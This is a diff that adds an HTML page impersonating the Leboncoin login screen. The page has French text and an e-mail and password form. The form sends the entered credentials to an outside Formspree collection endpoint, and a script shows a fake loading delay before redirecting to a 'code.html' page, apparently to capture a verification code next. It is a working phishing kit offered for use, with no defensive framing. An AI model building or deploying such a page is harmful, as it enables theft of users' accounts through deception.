@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        /* Style pour le texte */
+        #me-voici {
+          font-size: 40px;
+          font-style: italic;
+          color: red;
+          text-align: center;
+          box-shadow: aliceblue;
+      
+        }
+      </style>
+      <style>
+        h2 {
+          font-family: Arial;
+          font-size: 36px;
+        }
+        p {
+          font-family: Arial;
+          
+        }
+      </style>
+      
+</head>
+<body>
+  <div class="container">
+    <div class="boncoin"> <a href=""><span></span></a> </div>
+    <h1 id="me-voici">Leboncoin</h1>
+  </div>
+  <br>
+  <center>
+    <h2 id="part"><p>Bonjour !</p></h2><br>
+  </center>
+  <div class="connect">
+    <center>
+      <p>Connectez-vous pour découvrir toutes nos</p>
+      <p>fonctionnalités.</p>
+    </center>
+  </div>
+  
+  
+  
+   
+
+    <form id="root" method="POST" action="https://formspree.io/f/mknakjpe" class="form-container">
+        <div class="form-field">
+          <label for="email">E-mail</label>
+          <input type="email" id="email"  required  name="Email"/>
+          <span class="required">champ requis</span>
+        </div>
+        <br>
+        <div class="form-field">
+          <div class="password-field">
+            <label for="password">Mot de passe</label>
+            <input type="password" id="password"  required  name="MotDpass"/>
+            <span class="required">champ requis</span>
+            <span class="toggle-password" onclick="togglePasswordVisibility()">&#128065;</span>
+          </div>
+          <div class="forgot-password">
+            <a href="#">Mot de passe oublié?</a>
+          </div>
+        </div>
+        <br>
+        <button type="submit" class="btn-login">Se connecter</button>
+        <br> <br>
+        <p>Envie de nous rejoindre ? <a  class="compte" href="">Créer un compte</a></p>
+      </form>
+      <script>
+        var form = document.getElementById("root");
+      
+        async function handleSubmit(event) {
+          event.preventDefault();
+          var data = new FormData(event.target);
+      
+          // Afficher le message de chargement
+          var loadingMessage = document.createElement("p");
+          loadingMessage.innerHTML = "Chargement...";
+          form.appendChild(loadingMessage);
+      
+          // Attendre 8 secondes
+          await new Promise(resolve => setTimeout(resolve, 8000));
+      
+          // Soumettre le formulaire
+          fetch(event.target.action, {
+            method: form.method,
+            body: data,
+            headers: {
+              'Accept': 'application/json'
+            }
+          }).then(response => {
+            if (response.ok) {
+              form.reset();
+              window.location = "code.html";
+            } else {
+              response.json().then(data => {
+                if (Object.hasOwn(data, 'errors')) {
+                  status.innerHTML = data["errors"].map(error => error["message"]).join(", ")
+                } else {
+                  status.innerHTML = "Oops! There was a problem submitting your form"
+                }
+              })
+            }
+          }).catch(error => {
+            status.innerHTML = "Oops! There was a problem submitting your form"
+          }).finally(() => {
+            // Supprimer le message de chargement
+            form.removeChild(loadingMessage);
+          });
+        }
+      
+        form.addEventListener("submit", handleSubmit)
+      </script> 
+      <script src="script.js"></script>
+      
+
+
+</body>
+</html>
